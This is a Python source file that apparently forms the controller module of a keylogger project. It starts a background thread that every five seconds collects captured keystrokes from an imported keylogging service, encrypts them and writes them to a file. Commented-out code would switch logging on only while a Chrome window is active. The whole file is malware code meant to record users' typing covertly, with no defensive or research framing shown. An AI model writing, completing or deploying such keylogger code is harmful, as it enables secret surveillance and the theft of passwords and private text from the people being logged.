import json

from  encryptor_keylogger import Encryptor
from service_keylogger import ServiceKeyLogger
from writer_KeyLogger_to_file import WriteToFile
import pygetwindow as gw
import time
import threading
import psutil

class ManagerKeyLogger:
    def __init__(self):
        self.service = ServiceKeyLogger()
        self.to_file = WriteToFile()
        self.encryptor = Encryptor()
        self.writeFile=WriteToFile()
        self.listener_running = False
        # self.manager_thread_monitor_chrome = threading.Thread(target=self.monitor_chrome)
        # self.manager_thread_monitor_chrome.start()
        self.manager_thread_collect_data = threading.Thread(target=self.collect_data)
        self.manager_thread_collect_data.start()

    # def monitor_chrome(self):
    #     while True:
    #         if self.is_keyboard_in_chrome():
    #             if not self.listener_running:
    #                 self.service = ServiceKeyLogger()
    #                 self.service.start()
    #                 self.listener_running = True
    #         else:
    #             if self.listener_running:
    #                 self.service.listener.stop()
    #                 self.listener_running = False
    #
    #         time.sleep(2)

    def collect_data(self):
        while True:
            time.sleep(5)
            data = self.service.get_data()
            if data:
              # data_str = json.dumps(data)
              self.encryptor.encrypt(data)
              text_encrypt=self.encryptor.text_encrypto
              self.writeFile.write(text_encrypt)
              data_json=self.writeFile.load_data()
              # decrypt=self.encryptor.decrypt(data_json)
              print(data)
              print(data_json)
              # print(decrypt)
              print( text_encrypt)
              # print(decrypt)

    def is_keyboard_in_chrome(self):
        active_window = gw.getActiveWindow()

        return active_window and "chrome" in active_window.title.lower()

manager = ManagerKeyLogger()
